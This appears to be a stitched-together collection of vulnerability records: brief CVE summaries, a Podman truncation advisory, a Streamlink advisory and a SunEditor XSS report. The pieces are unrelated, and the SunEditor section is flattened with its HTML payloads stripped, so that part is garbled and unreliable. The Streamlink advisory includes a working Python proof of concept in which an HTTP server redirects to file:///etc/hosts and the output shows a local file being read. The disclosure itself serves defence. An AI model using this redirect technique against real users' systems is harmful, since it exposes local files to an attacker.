cves.summary: Vulnerability in VNC, TightVNC, and TridiaVNC allows local users to execute arbitrary code as LocalSystem by using the Win32 Messaging System to bypass the VNC GUI and access the "Add new clients" dialogue box.
Integer overflow in Gaim before 0.82 allows remote attackers to cause a denial of service and possibly execute arbitrary code via the size variable in Groupware server messages.

Integer overflow in the f_count counter in FreeBSD before 4.2 through 5.0 allows local users to cause a denial of service (crash) and possibly execute arbitrary code via multiple calls to (1) fpathconf and (2) lseek, which do not properly decrement f_count through a call to fdrop.

BRW WebWeaver 1.03 allows remote attackers to obtain sensitive server environment information via a URL request for testcgi.exe, which lists the values of environment variables and the current working directory.
Multiple format string vulnerabilities in the logger function in netzio.c for Tanne 0.6.17 allows remote attackers to execute arbitrary code via format string specifiers in syslog.
Cross-site scripting vulnerability (XSS) in WWWBoard 2.0A2.1 and earlier allows remote attackers to inject arbitrary HTML or web script via a message post.
tinc 1.0pre3 and 1.0pre4 allows remote attackers to inject data into user sessions by sniffing and replaying packets.

Unknown vulnerability in the file system protection subsystem in HP Secure OS Software for Linux 1.0 allows additional user privileges on some files beyond what is specified in the file system protection rules, which allows local users to conduct unauthorized operations on restricted files.
Unknown vulnerability in F-Secure Anti-Virus (FSAV) 4.52 for Linux before Hotfix 3 allows the Sober.D worm to bypass FASV.

Buffer overflow in hsrun.exe for HAHTsite Scenario Server 5.1 Patch 06 (build 91) allows remote attackers to cause a denial of service (crash) and possibly execute arbitrary code via a long project name.
Off-by-one buffer overflow in ModSecurity (mod_security) 1.7.4 for Apache 2.x, when SecFilterScanPost is enabled, allows remote attackers to execute arbitrary code via crafted POST requests.
Solaris sysdef command allows local users to read kernel memory, potentially leading to root privileges.

sort creates temporary files and follows symbolic links, which allows local users to modify arbitrary files that are writable by the user running sort, as observed in updatedb and other programs that use sort.
Buffer overflow in AIX xdat gives root access to local users.
telnet daemon (telnetd) from the Linux netkit package before netkit-telnet-0.16 allows remote attackers to bypass authentication when telnetd is running with the -L command line option.
PSCOErrPage.htm in Netscape PublishingXpert 2.5 before SP2 allows remote attackers to read arbitrary files by specifying the target file in the errPagePath parameter.

POP2 or POP3 server (pop3d) in imap-uw IMAP package on FreeBSD and other operating systems creates lock files with predictable names, which allows local users to cause a denial of service (lack of mail access) for other users by creating lock files for other mail boxes.
Multiple buffer overflows in RADIUS daemon radiusd in (1) Merit 3.6b and (2) Lucent 2.1-2 RADIUS allow remote attackers to cause a denial of service or execute arbitrary commands.

SunEditor from 3.0.0 before 3.4.0 contains a stored cross-site scripting vulnerability in html.clean() that rebuilds iframes from data-se-iframe-holder-attrs JSON without filtering srcdoc or uppercase SRC keys. Attackers can inject crafted HTML through paste, html.set, or html.insert to execute script in the host page origin when victims load or paste the content.

imgproxy from 3.3.0 before 4.0.16 contains an unbounded memory allocation vulnerability in the ICO loader that fails to validate the data_size field. Attackers can supply a crafted 23-byte ICO file declaring a ~4GB data_size to trigger memory exhaustion and worker crashes without authentication.

The labeled-response module in UnrealIRCd 6.0.0 before 6.2.7.1 does not escape the IRCv3 "label" message tag when echoing it into replies, which allows any user on a network with two or more linked servers to inject server-to-server commands that are executed with server authority.

Rustls from 0.23.13 before 0.23.45 accepts TLS 1.3 handshake messages at the wrong encryption level when they follow a key-changing message in the same record, because Deframer::aligned does not enforce RFC 8446 record-boundary alignment. A peer or on-path attacker can pack a plaintext EncryptedExtensions with the ServerHello, which rustls accepts unencrypted.

imgproxy from 4.0.0 before 4.0.16 contains an integer overflow in the ICO loader that allows remote attackers to trigger a heap buffer overflow via a crafted data_size value. Attackers can submit a crafted ICO image whose data_size wraps the allocation in vips/icoload.c, corrupting heap memory to crash the process or achieve code execution.

Hickory DNS hickory-proto 0.25.0-alpha.3 through 0.25.2 and hickory-net before 0.26.1 contain an unbounded loop vulnerability in DnssecDnsHandle NSEC3 closest-encloser proof validation when the SOA owner is not an ancestor of the QNAME. Upstream attackers can return NoData or NXDomain responses with a cross-zone SOA record to panic debug builds or exhaust memory in release builds.

rustls 0.23.44 and 0.23.45 contain an information disclosure vulnerability that sends application data buffered before the handshake completes to the client-facing server when Encrypted Client Hello is rejected. Because start_traffic() queues plaintext from ClientConnection::writer() before sending the ech_required alert, the authenticated public_name server receives data intended for the inner server.

rustls before 0.23.46 contains a key exchange downgrade vulnerability that allows network attackers to poison the per-server-name key-exchange group record via an unauthenticated ServerHello. Attackers can answer one connection with a ServerHello selecting X25519, causing later ClientHellos to send only classical shares and lose post-quantum confidentiality.

Hickory DNS hickory-proto from 0.3.1 before 0.26.1 contains a denial of service vulnerability in BinEncoder that allows remote attackers to exhaust CPU through quadratic-time name compression. Attackers can send malicious DNS messages with many records that add many candidate labels and trigger repeated linear scans during encoding, amplifying CPU exhaustion.

Hickory DNS hickory-proto 0.1 through 0.25.0-alpha.3 and hickory-net before 0.26.2 contain a DNSSEC validation bypass because the validator verifies an RRSIG against the DNSKEY of whatever name appears in its Signer's Name field without checking that this name is the zone containing the RRset. Attackers controlling any secure zone can produce valid signatures over arbitrary records in unrelated zones, which resolvers, recursors, and clients using DnssecDnsHandle accept as authenticated.

rustls before 0.23.46 contains an uncontrolled memory allocation flaw in its optional Brotli certificate decompression, which limits decompressed output size but accepts an input-selected large history window. Malicious peers can send a certificate with a five-byte Brotli header requesting up to 1 GiB before authentication, aborting Brotli-enabled clients or client-authenticating servers whose allocator cannot satisfy the request.

hickory-proto and hickory-resolver 0.26.0 before 0.26.2, hickory-server 0.25.0-alpha.1 before 0.26.2, and hickory-recursor 0.25.0-alpha.3 through 0.26.0-alpha.1 fail to canonicalize IPv4-mapped IPv6 addresses when checking deny_answers, deny_server, or AccessControlSet rules. Attackers can use IPv4-mapped addresses to evade answer filtering, trigger queries to denied nameservers, or reach hickory-server library deployments on dual-stack IPv6 sockets from denied clients.

imgproxy 3.3.0 before 4.0.17 contains an out-of-bounds heap read and write in the ICO loader's BMP header reconstruction (vips_foreign_load_ico_header in vips/icoload.c) when an ICO entry declares a tiny data size, causing unvalidated header fields to be read and written past the allocated buffer. Unauthenticated remote attackers can supply a crafted ICO image to corrupt adjacent heap chunk metadata, triggering a glibc abort that crashes the worker.

Hickory DNS hickory-resolver 0.26.0-beta.1 before 0.26.2 contains an unbounded retry loop in NameServerPool::try_send, which re-queues truncated (TC) responses without checking the answering transport or counting iterations. A malicious authoritative server returning TC=1 on every transport keeps the resolver spinning on a persistent TCP connection until the 5-second request deadline expires, causing resource exhaustion.

Rustls before 0.23.46 and 0.24.0-dev.1 before 0.24.0-dev.2 contains an information disclosure vulnerability where derived Debug formatting of client session values exposes secret key material. Custom ClientSessionStore implementations that log Tls12ClientSessionValue or Tls13ClientSessionValue can leak TLS 1.2 master secrets or TLS 1.3 resumption PSKs to log readers.

The hickory-dns recursor in hickory-recursor 0.25.0-alpha.3 through 0.25.2 and hickory-resolver 0.26.0-alpha.1 before 0.26.2 iterates every out-of-bailiwick NS target lacking glue in a referral without any per-query work budget. Remote attackers can serve such referrals to force A and AAAA lookups per target, amplifying traffic against remote servers or exhausting recursor resources.

The Hickory DNS recursor in all versions of hickory-recursor and in hickory-resolver 0.26.0-beta.1 before 0.26.2 (recursor feature) is vulnerable to ghost domain names attacks because it reuses child-side apex NS RRsets cached from zone NS queries for iterative resolution. By repeatedly querying a zone's NS records, an attacker keeps the stale RRset cached indefinitely, letting name servers whose delegation the parent revoked keep answering for the zone.

Hickory DNS hickory-proto 0.25 through 0.26.0-alpha.1 and hickory-net 0.26.0-beta.1 before 0.26.2 contain a DNSSEC validation flaw in the validating recursor's NSEC3 handler, which matches the closest encloser by hash alone without checking the type bitmap and so accepts parent-side ancestor-delegation NSEC3 records as proof of nonexistence. An attacker who delivers one response built from genuinely signed parent NSEC3 records can cause NXDOMAIN or NODATA to be cached with AD=1, denying resolution of existing names at and below the zone cut.

Hickory DNS hickory-proto before 0.26.0-beta.1 and hickory-net before 0.26.2 contain a DNSSEC validation bypass because verify_rrsets() ignores DNS class when partitioning RRsets, so non-IN records skip signature verification yet are marked secure when the IN records verify. Attackers able to supply DNS responses can include forged CH or HS class records, including DS records, to authenticate any DNSKEY and forge child zone responses.
Directory traversal vulnerability in nph-publish before 1.2 allows remote attackers to overwrite arbitrary files via a .. (dot dot) in the pathname for an upload operation.
HTTP server for Xerox DocuColor 4 LP allows remote attackers to cause a denial of service (hang) via a long URL that contains a large number of . characters.
Pluggable Authentication Modules (PAM) in Red Hat Linux 6.1 does not properly lock access to disabled NIS accounts.
Buffer overflow in OpenLink 3.2 allows remote attackers to gain privileges via a long GET request to the web configurator.

### Impact

When running `podman quadlet install --replace` to replace a Quadlet file, if the original Quadlet is larger than the new Quadlet, the file would not be truncated and content from the original would be preserved. There is no risk of information leakage as the user already had access to the Quadlet in order to replace it, and in most cases, this would only lead to invalid Quadlet files (see https://github.com/podman-container-tools/podman/issues/29013). However, security-related options from the end of the old Quadlet could be included in the new Quadlet, and if the truncation resulted in a valid Quadlet file, this could result in undesirable behavior. For example, running `podman quadlet install --replace` to remove a single line from the end of a Quadlet - including security-sensitive content, like `AddCapability` - will fail, and the option will continue to be used. Further, with Volume Quadlets, this can include additional mounts which can cause content to be unintentionally exposed into containers. If, later, the image is updated then compromised content might be leaked to an attacker.

First introduced in commit 0ea4eaee70b7458bcc99d875529761faf5172651 with podman 5.7.0

### Patches
a38a9b7d20915c55e6f3c451101ae72d6da33742 (fixed in 6.0.0)

d3adfdeec7d5c9eee5a6978df3bee62a866c958d d4fe9154ec6e32a02d5fcd096c4a27c38f2040f4 (for v5.8 branch, fixed in 5.8.6)

### Workarounds
Manually copy the quadlet files to the quadlet directory.

### Credits

Podman thanks Christopher Lusk <clusk@northecho.dev> (North Echo Security Research) for reporting the security impact of this problem.

## Summary

`HTTPSession` mounts a `FileAdapter` for the `file://` scheme and inherits redirect handling
unchanged from `requests.Session`. `requests` does not check for scheme downgrades or
cross-protocol transitions when it follows a redirect, so any http(s) request Streamlink makes can
be redirected by the remote server into `file:///...` and the local file is returned as the
response body.

`GHSA-hgqw-6m45-hw5f` / `CVE-2026-44353` fixed direct `file://` segment and playlist URIs in HLS
playlists and DASH manifests. Those checks look at the URL as it appears in the manifest, so a
manifest that lists an ordinary `https://` URL passes them, and the redirect happens later at fetch
time. The attack surface is the same one that advisory describes, but the flaw is one level down in
`HTTPSession` rather than in the streaming implementations, so it applies to every request the
session makes and not only to segment and manifest fetches.

## Affected version

Executed against released `streamlink 8.5.0` (PyPI, installed into a clean venv on
Python 3.12).

## Attacker model

The attacker controls a URL the victim's Streamlink run reaches: a playlist or manifest URL passed
on the command line, or any http(s) URL referenced from attacker-controlled manifest content. No
privileges on the victim host and no `file://` input are required, and the `file://` scheme never
appears in anything the victim or the manifest parser sees.

## Proof of concept, executed

```python
import threading
from http.server import BaseHTTPRequestHandler, HTTPServer

from streamlink.exceptions import StreamError
from streamlink.session.http import HTTPSession

class H(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == "/segment":
            self.send_response(302)
            self.send_header("Location", "file:///etc/hosts")
            self.end_headers()
        else:
            self.send_response(404)
            self.end_headers()

    def log_message(self, *a):
        pass

srv = HTTPServer(("127.0.0.1", 0), H)
port = srv.server_port
threading.Thread(target=srv.serve_forever, daemon=True).start()

s = HTTPSession()
res = s.get(f"http://127.0.0.1:{port}/segment", exception=StreamError, timeout=5)
print("requested   http://127.0.0.1:%d/segment" % port)
print("final_url  ", res.url)
print("status     ", res.status_code)
print("content    ", res.content[:40])
srv.shutdown()
```

Output:

```text
requested   http://127.0.0.1:52205/segment
final_url   file:///etc/hosts
status      200
content     b'##\n# Host Database\n#\n# localhost is used'
```

The request goes out over http, the response comes back from the local filesystem, and nothing in
between rejects the scheme change. Substituting a path the attacker wants read for `/etc/hosts`
returns that file's contents into whatever consumes the response, which for a segment fetch means
the file is written into the stream output.

## Suggested fix

Override `get_redirect_target()` or `resolve_redirects()` on `HTTPSession` and reject a redirect
whose target scheme is not the same as the request's scheme or a permitted upgrade of it. Doing it
on the session rather than through a response hook keeps plugin authors from removing the check by
overriding hooks. Custom protocol adapters can still redirect, but only to `https` or to their own
scheme.

### AI tooling

AI assistance was used for the code audit and for drafting this report. The finding was manually verified against the project's source at the location cited above before reporting it, and the severity and impact assessment are my own.

## Summary SUNEDITOR `v2.47.10` appears to allow JavaScript execution through crafted namespaced HTML elements. The sanitization logic does not fully remove executable event-handler attributes from certain custom/namespaced tags. As a result, an attacker may be able to inject HTML content that executes JavaScript when the rendered element is interacted with. This behavior was observed after the changes introduced in this commit: https://github.com/JiHong88/suneditor/commit/9ed405fb0de676e56cd0e6a13c19c103ad5948d3 ## Affected Version Confirmed vulnerable: * SUNEDITOR =< `2.47.10` Potentially affected: * Previous versions, if the same sanitization logic is still present ## Proof of Concept The following payload preserves an executable event handler: ```html

click

``` Simplified PoC: ```html click ``` ```html

📎 Click here for solutions

``` ## Steps to Reproduce 1. Open SUNEDITOR using version `2.47.10`. 2. Insert the payload above into the editor. 3. Save or render the generated content. 4. Click the generated element. 5. Observe that JavaScript is executed. ## Impact This may allow an attacker to inject arbitrary JavaScript into rendered editor content. Depending on how SUNEDITOR is integrated into an application, this could lead to: * Stored XSS * DOM manipulation * Session theft * Credential theft * Account takeover actions performed in the victim’s browser context ## Technical Details The issue appears to be related to incomplete handling of namespaced/custom HTML elements such as: ```html ``` Event-handler attributes such as `onclick` can remain attached to these crafted elements and execute when interacted with. This suggests that the sanitization process may not consistently normalize and validate custom or namespaced elements before applying attribute filtering. ## Suggested Remediation Possible mitigations include: * Normalize DOM elements before sanitization. * Explicitly reject or unwrap unknown/custom/namespaced tags. * Strip all event-handler attributes from all elements, including unknown/custom elements. * Re-validate sanitized output after browser DOM parsing. * Add regression tests for namespaced/custom tag payloads.

cves.summary: Mongoid may omit encryption rules for fields declared on embedded models when generating the client-side field-level encryption schema. Applications that enable this feature can therefore store values intended to be encrypted in readable form, with no error or warning. A party with routine read access to the database, a backup, or the underlying data files may then see data that was meant to remain unreadable outside the application.
IBM WebSphere Application Server 9.0 and 8.5 is affected by a log injection vulnerability through crafted LTPA token cookies.
Microsoft Exchange Server 5.5 and 5.0 does not properly handle (1) malformed NNTP data, or (2) malformed SMTP data, which allows remote attackers to cause a denial of service (application error).

Microsoft Excel 97 does not warn the user before executing worksheet functions, which could allow attackers to execute arbitrary commands by using the CALL function to execute a malicious DLL, aka the Excel "CALL Vulnerability."
Vulnerability in urestore in Novell UnixWare 1.1 allows local users to gain root privileges.
